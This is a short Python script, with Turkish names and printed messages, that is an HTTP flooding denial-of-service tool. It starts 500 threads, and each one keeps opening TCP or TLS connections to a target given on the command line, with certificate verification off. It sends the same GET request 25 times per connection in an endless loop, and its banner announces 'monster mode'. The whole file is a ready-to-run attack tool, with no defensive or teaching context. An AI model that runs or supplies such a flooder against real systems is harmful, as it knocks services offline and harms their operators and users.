import socket, ssl, sys, threading, time

thread_sayisi = 500
msg = b"GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n"

def vur(hedef, port):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    payload = msg.replace(b"target", hedef.encode())
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            if port == 443:
                s = context.wrap_socket(s, server_hostname=hedef)
            s.connect((hedef, port))
            for _ in range(25): # Darbe sayısını artırdık
                s.send(payload)
            s.close()
        except:
            time.sleep(0.01)

def baslat():
    hedef = sys.argv[1]
    port = int(sys.argv[2])
    print(f"\n!!! CANAVAR MODU AKTIF !!!")
    print(f"[*] Hedef: {hedef}:{port}")
    print(f"[*] Guc: {thread_sayisi} Agresif Isçi")
    
    for i in range(thread_sayisi):
        t = threading.Thread(target=vur, args=(hedef, port))
        t.daemon = True
        t.start()
    
    while True:
        time.sleep(1)

if __name__ == "__main__":
    baslat()
